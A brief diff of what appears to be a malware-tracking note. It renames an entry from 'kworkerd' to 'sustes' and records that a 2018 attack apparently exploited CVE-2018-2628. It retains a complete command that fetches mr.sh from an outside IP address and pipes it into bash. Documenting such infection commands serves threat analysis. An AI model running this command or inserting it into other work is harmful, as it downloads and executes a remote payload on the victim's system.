@@ -1,4 +1,4 @@
-# kworkerd
+# sustes
 2018.9 疑似利用CVE-2018-2628作为攻击手段
 wget –q –O- http://192.99.142.226:8220/mr.sh | bash -sh
 
